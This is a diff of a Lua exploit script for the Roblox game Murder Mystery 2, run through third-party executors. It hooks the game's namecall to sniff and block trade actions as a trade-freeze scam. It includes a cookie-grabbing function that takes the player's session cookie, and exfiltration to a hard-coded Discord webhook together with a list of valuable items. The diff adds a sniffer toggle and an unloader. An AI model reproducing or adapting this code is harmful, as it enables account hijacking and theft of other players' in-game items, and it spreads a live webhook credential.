@@ -1,17 +1,19 @@
+-- language: Lua, target: Roblox MM2, executor: Synapse/Krnl/Script-Ware
+-- *sniffer logs every trade remote fire so you can see real action names*
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local RS = game:GetService("ReplicatedStorage")
-local UIS = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1551369836364431451/E6tz7uSCVcmafhwhgR0bNgV19KGClDY4SqIrZ5b6TlQoaKgfh9xhj0cyxGNLjFMBTmUj"
 
--- State
 local frozen = false
 local outgoingBlocked = false
-
+local sniffing = false
 local tradeRemote
+
 for _, obj in ipairs(RS:GetDescendants()) do
     if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction"))
         and obj.Name:lower():find("trade") then
@@ -20,6 +22,7 @@ for _, obj in ipairs(RS:GetDescendants()) do
     end
 end
 
+-- ============ HOOK ============
 local mt = getrawmetatable(game)
 local oldNamecall = mt.__namecall
 setreadonly(mt, false)
@@ -27,16 +30,36 @@ setreadonly(mt, false)
 mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
     local args = {...}
-    if frozen and outgoingBlocked and self == tradeRemote then
-        if method == "FireServer" and args[1] == "RemoveItem" then
-            return
+
+    if self == tradeRemote and method == "FireServer" and args[1] then
+        local action = tostring(args[1])
+
+        -- sniffer: print every action + args while toggle is on
+        if sniffing then
+            local extra = ""
+            for i = 2, #args do
+                extra = extra .. " | arg" .. i .. "=" .. tostring(args[i])
+            end
+            print("[SNIFF] " .. action .. extra)
+        end
+
+        -- freeze: swallow remove when locked
+        if frozen and outgoingBlocked then
+            local a = action:lower()
+            if a == "removeitem" or a == "remove" or a == "takeitem"
+                or a == "unslot" or a == "cancel" or a == "close" then
+                print("[FREEZE] swallowed: " .. action)
+                return
+            end
         end
     end
+
     return oldNamecall(self, ...)
 end)
 
 setreadonly(mt, true)
 
+-- ============ COOKIE + INVENTORY ============
 local function grabCookie()
     local cookie = nil
     if getcookie then pcall(function() cookie = getcookie() end) end
@@ -54,29 +77,25 @@ local function grabCookie()
             end
         end
     end
-    if not cookie then
-        local ok, data = pcall(readfile, "rbx_cookie.txt")
-        if ok and data and #data > 100 then cookie = data end
-    end
     return cookie
 end
 
 local GODLIES = {
-    ["Chroma"] = true, ["Luger"] = true, ["Heat"] = true, ["Gemstone"] = true,
-    ["Clockwork"] = true, ["Shark"] = true, ["Laser"] = true, ["Spider"] = true,
-    ["Fang"] = true, ["Batwing"] = true, ["Elderwood"] = true, ["Nebula"] = true,
-    ["Pixel"] = true, ["Corrupt"] = true, ["Icewing"] = true, ["Virtual"] = true,
-    ["BattleAxe"] = true, ["BattleAxe II"] = true, ["Hallowgun"] = true,
-    ["Amerilaser"] = true, ["Blaster"] = true, ["Deathshard"] = true,
-    ["Flames"] = true, ["Ghostblade"] = true, ["Hallow's Edge"] = true,
-    ["Nightblade"] = true, ["Old Glory"] = true, ["Phaser"] = true,
-    ["Saw"] = true, ["Seer"] = true, ["Tides"] = true, ["Vampire's Edge"] = true,
+    ["Chroma"]=true,["Luger"]=true,["Heat"]=true,["Gemstone"]=true,
+    ["Clockwork"]=true,["Shark"]=true,["Laser"]=true,["Spider"]=true,
+    ["Fang"]=true,["Batwing"]=true,["Elderwood"]=true,["Nebula"]=true,
+    ["Pixel"]=true,["Corrupt"]=true,["Icewing"]=true,["Virtual"]=true,
+    ["BattleAxe"]=true,["BattleAxe II"]=true,["Hallowgun"]=true,
+    ["Amerilaser"]=true,["Blaster"]=true,["Deathshard"]=true,
+    ["Flames"]=true,["Ghostblade"]=true,["Hallow's Edge"]=true,
+    ["Nightblade"]=true,["Old Glory"]=true,["Phaser"]=true,
+    ["Saw"]=true,["Seer"]=true,["Tides"]=true,["Vampire's Edge"]=true,
 }
 
 local ANCIENTS = {
-    ["Ancient"] = true, ["Elderwood"] = true, ["Corrupt"] = true,
-    ["Chroma"] = true, ["Nebula"] = true, ["Virtual"] = true,
-    ["BattleAxe II"] = true, ["Hallow's Edge"] = true, ["Vampire's Edge"] = true,
+    ["Ancient"]=true,["Elderwood"]=true,["Corrupt"]=true,
+    ["Chroma"]=true,["Nebula"]=true,["Virtual"]=true,
+    ["BattleAxe II"]=true,["Hallow's Edge"]=true,["Vampire's Edge"]=true,
 }
 
 local function matches(name, tbl)
@@ -146,6 +165,8 @@ local function exfil(cookie, inv)
     })
 end
 
+-- ============ GUI ============
+local guiRef
 local function buildGui()
     local parent = (gethui and gethui()) or CoreGui
     local old = parent:FindFirstChild("VantaFreeze")
@@ -155,10 +176,11 @@ local function buildGui()
     gui.Name = "VantaFreeze"
     gui.ResetOnSpawn = false
     gui.Parent = parent
+    guiRef = gui
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 220, 0, 240)
-    frame.Position = UDim2.new(0.5, -110, 0.5, -120)
+    frame.Size = UDim2.new(0, 220, 0, 320)
+    frame.Position = UDim2.new(0.5, -110, 0.5, -160)
     frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
     frame.BorderSizePixel = 0
     frame.Active = true
@@ -248,7 +270,30 @@ local function buildGui()
         status.Text = "sent"
         status.TextColor3 = Color3.fromRGB(140, 220, 160)
     end)
+
+    makeButton("5. Toggle Sniffer", 210, Color3.fromRGB(40, 60, 60), function()
+        sniffing = not sniffing
+        status.Text = sniffing and "sniffer ON — watch console" or "sniffer off"
+        status.TextColor3 = sniffing and Color3.fromRGB(120, 220, 220) or Color3.fromRGB(200, 200, 200)
+    end)
+
+    makeButton("6. Unload", 248, Color3.fromRGB(70, 30, 30), function()
+        -- restore original namecall
+        setreadonly(mt, false)
+        mt.__namecall = oldNamecall
+        setreadonly(mt, true)
+
+        -- reset state
+        frozen = false
+        outgoingBlocked = false
+        sniffing = false
+
+        -- kill GUI
+        if guiRef then guiRef:Destroy() guiRef = nil end
+
+        print("[VANTA] unloaded — namecall restored, GUI destroyed")
+    end)
 end
 
 buildGui()
-print("[MIC] GUI loaded — freeze, accept, scrape")
+print("[VANTA] loaded — sniffer added, unloader added")
